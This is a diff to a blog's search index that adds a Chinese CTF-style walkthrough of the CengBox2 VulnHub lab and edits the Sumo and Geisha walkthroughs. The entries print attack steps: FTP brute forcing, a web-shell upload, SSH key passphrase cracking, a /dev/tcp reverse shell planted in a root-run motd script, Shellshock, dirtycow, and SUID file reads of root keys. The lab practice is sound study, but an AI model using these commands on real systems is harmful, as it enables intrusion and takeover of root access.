@@ -1,12 +1,21 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[CengBox2 walkthrought]]></title>
+    <url>%2F2022%2F06%2F13%2FCengBox2_walkthrough%2F</url>
+    <content type="text"><![CDATA[前言这回来做个中等难度的靶机CengBox2，又学到了很多新知识，这个靶机还是设计得挺好、挺巧妙的。 https://www.vulnhub.com/entry/cengbox-2,486/ 利用过程使用nmap扫描出21，22和80端口。 1nmap -sV -T 4 -p- 192.168.100.102 打开网页说网站已不提供服务，例行扫目录也是没扫到扫描东西。 利用hydra爆破下root、ceng、ftp这几个账号的ftp密码，其中账号ftp被爆破出来了，而且是好几个密码！！后面试了下其实是没设密码，直接能登录。 1hydra -P /usr/share/wordlists/fasttrack.txt -L userlist.txt ftp://192.168.100.102 登录进去有一则留言，说在一个新的域名ceng-company.vm里设置了一个面板，并为Kevin创建一个用户，密码为默认密码，那就是弱口令咯 :D Hey Kevin,I just set up your panel and used default password. Please change them before any hack. I try to move site to new domain which name is ceng-company.vm and also I created a new area for you. Aaron 当我改/etc/hosts令ceng-company.vm解析为192.168.100.102，重新回到页面，它还是原来的样子。 去偷瞄了下别人的walkthrough，网站原来是在子域名里。由于常用的一些子域名爆破工具都是居于DNS的，在这里肯定是没法用的，所以直接把字典导入到burpsuite里，改Host爆破即可。 爆破到admin时可用看见返回的状态码和长度都跟别的不一样，所以可以确定正确的子域名就是这个了。 再在/etc/hosts里加一条admin.cencompany.vm解析到192.168.100.102。接下来依旧要爆破目录，一开始使用默认的字典没爆破出什么东西，后来换成dirburster的大字典就可以了。这里我用的是dirseach来爆破。 1python3 dirsearch.py -u http://admin.ceng-company.vm/ -e all -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 网站是Gila CMS，搜到了两个有点用的洞，本地文件包含和文件上传绕过。 后台为admin，用户名提示为邮箱，那就用kevin@ceng-company.vm。用burpsuite爆破，没一会就给ban了。 于是手动爆破，测到admin就进入到后台。进到后台发现不用搜到的漏洞也行，因为有文件管理功能，直接插入一句话即可。 反弹一个shell，用Privilege Escalation Awesome Scripts SUITE扫描了下可能可以提权的点。发现www-data可以无需密码，以swartz的身份运行/home/swartz/runphp.sh。 123#!/bin/bashphp -a 运行这个脚本可交互地输入php代码，那即可弹出swartz的shell。由于反弹的shell显示php的交互界面不正常，可以用python3弹出个完整的shell。 12python3 -c "import pty;pty.spawn('/bin/bash')"sudo -u swartz /home/swartz/runphp.sh 现在就显示正常了。 再输入system(&quot;/bin/bash&quot;);弹出swartz的shell，用提权脚本重新扫描下，发现swartz可以读mitnick用户目录下的ssh私钥。 把私钥下载下来，使用私钥连接ssh时，发现是需要passphrase的。 john可以破解passphrase，先把ssh私钥转为john可识别的格式，再进行爆破。 12/usr/share/john/ssh2john.py /tmp/rsa &gt; /tmp/tmpjohn --wordlist=/usr/share/wordlists/rockyou.txt /tmp/tmp 用密码legend，登录到mitnick，cat ~/user.txt拿到home目录下的flag。 除了无需密码sudo -u外，扫描还发现了/etc/update-motd.d目录下的脚本可写。这下脚本是属于root的可执行文件，每当有用户通过ssh登录时会以root权限自动运行，运行结果就是我们ssh登录时看到的欢迎信息。 在其中一个脚本里插入个反弹shell，退出并重新登录ssh，成功反弹root的shell回来。 1bin/bash -c "bash -i &gt;&amp; /dev/tcp/192.168.100.101/4444 0&gt;&amp;1" 参考CengBox 2 Vulnhub Walkthrough]]></content>
+      <tags>
+        <tag>靶机</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Sumo walkthrought]]></title>
     <url>%2F2022%2F06%2F12%2FSumo-walkthrough%2F</url>
     <content type="text"><![CDATA[前言这也是一个很简单的靶机，用到的知识点是CVE-2014-6278的bash命令注入和dirtycow提权。 https://www.vulnhub.com/entry/sumo-1,480/ 利用过程拿到手肯定是要信息收集一波，nmap扫到只开放了22端口和80端口。 80端口进去是默认页面，目录扫出了cgi-bin和server-status目录，状态码都是403。 再用nikto扫下，扫出来了CVE-2014-6278和CVE-2014-6271，是bash命令注入的漏洞，msf里已有exp。 进msf选中利用模块，设置好参数，攻击后正常返回一个meterpreter session。 启动一个shell之后，运行whoami命令和uname -a命令。当前用户是www-data，并且发现内核版本较低，可用dirtycow提权。 使用github上的exp https://github.com/FireFart/dirtycow 上传到靶机，并用以下命令编译运行 12gcc dirty.c -o dirty lpthread./dirty &lt;new_password&gt; 命令执行后要等一段时间，成功后会创建名为firefart的root用户，密码为运行命令时输入的密码。 ssh登录上去，在/root目录即可获得flag。]]></content>
       <tags>
         <tag>靶机</tag>
-        <tag>提权&quot;</tag>
+        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
@@ -15,7 +24,7 @@
     <content type="text"><![CDATA[前言准备接受社会毒打，先找几个靶机打打，提高内网、后渗透水平，免得不会深入就说你noob，疯狂踩。 起手先去vulnhub找了个入门到中间难度的靶机Geisha(叫给啥？？)，目标：Get the root shell and then obtain flag under /root)。 利用把所有端口都扫了一遍，发现开启了ftp、ssh和很多http服务的端口。 每个http服务主页都是一张图片，没什么功能，但其中在7125端口扫到了passwd和shadow，passwd能下载下来。在shadow里看见有两个账号可登录分别是root和geisha，于是用hydra跑下弱口令。 用个小字典一下子就跑出来了，事情发展到目前为止似乎还挺顺利。 但是uname -a看下靶机的发行版本挺新的，偷瞄了下别人的walkthough，发现是利用SUID可执行文件运行时可暂时获得文件拥有者的权限的这个特点来提权的（新技能get）。 使用命令find / -perm -u=s -type f 2&gt;/dev/null搜索所有SUID可执行文件，发现个base32可以用来任意文件读取。 用base32 /root/flag.txt | base32 -d直接读flag或者base32 /root/.ssh/id_rsa | base32 -d读ssh私钥在本地导入即可。 参考Linux Privilege Escalation using SUID Binaries]]></content>
       <tags>
         <tag>靶机</tag>
-        <tag>提权&quot;</tag>
+        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
